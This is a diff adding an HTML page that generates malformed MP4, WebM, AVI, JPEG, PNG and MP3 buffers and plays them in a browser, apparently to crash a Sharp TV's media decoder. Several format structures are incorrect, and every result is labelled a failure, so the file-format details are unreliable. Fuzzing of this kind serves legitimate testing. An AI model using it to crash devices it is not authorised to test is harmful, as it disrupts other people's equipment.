@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Multimedia Exploit Test Suite</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .test { margin: 10px 0; padding: 10px; border: 1px solid #0f0; }
+        .success { background: #030; }
+        .fail { background: #300; }
+        .testing { background: #330; }
+    </style>
+</head>
+<body>
+    <h1>Multimedia Exploit Test Suite</h1>
+    <p>Testing malformed media files against Sharp TV decoder</p>
+    <div id="results"></div>
+    
+    <script>
+        var tests = [
+            { name: "Malformed MP4", type: "video/mp4", data: createMalformedMP4() },
+            { name: "Malformed WebM", type: "video/webm", data: createMalformedWebM() },
+            { name: "Malformed AVI", type: "video/avi", data: createMalformedAVI() },
+            { name: "Malformed JPEG", type: "image/jpeg", data: createMalformedJPEG() },
+            { name: "Malformed PNG", type: "image/png", data: createMalformedPNG() },
+            { name: "Malformed MP3", type: "audio/mp3", data: createMalformedMP3() }
+        ];
+        
+        var resultsDiv = document.getElementById('results');
+        
+        function createMalformedMP4() {
+            // MP4 with invalid track header
+            var buf = new ArrayBuffer(64);
+            var view = new DataView(buf);
+            view.setUint32(0, 64); // size
+            view.setUint32(4, 0x66747970); // 'ftyp'
+            view.setUint32(8, 0x69736F6D); // 'isom'
+            view.setUint32(12, 0); // minor version
+            view.setUint32(16, 0x69736F6D); // compatible brand
+            // Invalid track header
+            view.setUint32(20, 100); // size
+            view.setUint32(24, 0x74726B68); // 'trkh'
+            view.setUint32(28, 0xFFFFFFFF); // invalid creation time
+            return buf;
+        }
+        
+        function createMalformedWebM() {
+            // WebM with invalid segment info
+            var buf = new ArrayBuffer(64);
+            var view = new DataView(buf);
+            view.setUint8(0, 0x1A); // EBML header
+            view.setUint8(1, 0x45);
+            view.setUint8(2, 0xDF);
+            view.setUint8(3, 0xA3);
+            view.setUint8(4, 0x93);
+            view.setUint8(5, 0x42);
+            view.setUint8(6, 0x82);
+            view.setUint8(7, 0x01);
+            // Invalid segment
+            view.setUint8(8, 0x18);
+            view.setUint8(9, 0x53);
+            view.setUint8(10, 0x80);
+            view.setUint8(11, 0x67);
+            view.setUint8(12, 0x01);
+            return buf;
+        }
+        
+        function createMalformedAVI() {
+            // AVI with invalid header
+            var buf = new ArrayBuffer(64);
+            var view = new DataView(buf);
+            view.setUint32(0, 0x41564920); // 'AVI '
+            view.setUint32(4, 0x4C495354); // 'LIST'
+            view.setUint32(8, 0xFFFFFFFF); // invalid size
+            view.setUint32(12, 0x6864726C); // 'hdrl'
+            return buf;
+        }
+        
+        function createMalformedJPEG() {
+            // JPEG with invalid SOI
+            var buf = new ArrayBuffer(16);
+            var view = new DataView(buf);
+            view.setUint8(0, 0xFF);
+            view.setUint8(1, 0xD8); // SOI
+            view.setUint8(2, 0xFF);
+            view.setUint8(3, 0xE0); // APP0
+            view.setUint16(4, 16, true); // length
+            view.setUint8(6, 0x4A); // 'J'
+            view.setUint8(7, 0x46); // 'F'
+            view.setUint8(8, 0x49); // 'I'
+            view.setUint8(9, 0x46); // 'F'
+            view.setUint8(10, 0x00);
+            view.setUint8(11, 0x01);
+            view.setUint8(12, 0x01);
+            view.setUint8(13, 0x00);
+            view.setUint8(14, 0x00);
+            view.setUint8(15, 0x01);
+            return buf;
+        }
+        
+        function createMalformedPNG() {
+            // PNG with invalid IHDR
+            var buf = new ArrayBuffer(33);
+            var view = new DataView(buf);
+            // PNG signature
+            view.setUint8(0, 0x89);
+            view.setUint8(1, 0x50);
+            view.setUint8(2, 0x4E);
+            view.setUint8(3, 0x47);
+            view.setUint8(4, 0x0D);
+            view.setUint8(5, 0x0A);
+            view.setUint8(6, 0x1A);
+            view.setUint8(7, 0x0A);
+            // IHDR chunk
+            view.setUint32(8, 13); // length
+            view.setUint32(12, 0x49484452); // 'IHDR'
+            view.setUint32(16, 64); // width
+            view.setUint32(20, 64); // height
+            view.setUint8(24, 8); // bit depth
+            view.setUint8(25, 2); // color type
+            view.setUint8(26, 0); // compression
+            view.setUint8(27, 0); // filter
+            view.setUint8(28, 0); // interlace
+            view.setUint32(29, 0); // CRC
+            return buf;
+        }
+        
+        function createMalformedMP3() {
+            // MP3 with invalid frame header
+            var buf = new ArrayBuffer(16);
+            var view = new DataView(buf);
+            view.setUint8(0, 0xFF);
+            view.setUint8(1, 0xFB); // frame sync + version + layer
+            view.setUint8(2, 0x80); // bitrate + padding
+            view.setUint8(3, 0x00); // sample rate + private + channel
+            return buf;
+        }
+        
+        function testMedia(index) {
+            if (index >= tests.length) {
+                resultsDiv.innerHTML += "<p><strong>ALL TESTS COMPLETE</strong></p>";
+                return;
+            }
+            
+            var test = tests[index];
+            var div = document.createElement('div');
+            div.className = 'test testing';
+            div.innerHTML = "<strong>" + test.name + "</strong> - Testing...";
+            resultsDiv.appendChild(div);
+            
+            // Create blob URL and try to play
+            var blob = new Blob([test.data], { type: test.type });
+            var url = URL.createObjectURL(blob);
+            
+            if (test.type.startsWith('video/')) {
+                var video = document.createElement('video');
+                video.src = url;
+                video.play().catch(function(e) {
+                    div.className = 'test fail';
+                    div.innerHTML += " - Play failed: " + e.message;
+                    testMedia(index + 1);
+                });
+            } else if (test.type.startsWith('image/')) {
+                var img = document.createElement('img');
+                img.src = url;
+                img.onload = function() {
+                    div.className = 'test fail';
+                    div.innerHTML += " - Image loaded (no crash)";
+                    testMedia(index + 1);
+                };
+                img.onerror = function() {
+                    div.className = 'test fail';
+                    div.innerHTML += " - Image error (no crash)";
+                    testMedia(index + 1);
+                };
+            } else if (test.type.startsWith('audio/')) {
+                var audio = document.createElement('audio');
+                audio.src = url;
+                audio.play().catch(function(e) {
+                    div.className = 'test fail';
+                    div.innerHTML += " - Play failed: " + e.message;
+                    testMedia(index + 1);
+                });
+            }
+            
+            // Timeout check
+            setTimeout(function() {
+                if (div.className === 'test testing') {
+                    div.className = 'test fail';
+                    div.innerHTML += " - Timeout (no crash)";
+                    testMedia(index + 1);
+                }
+            }, 5000);
+        }
+        
+        testMedia(0);
+    </script>
+</body>
+</html>
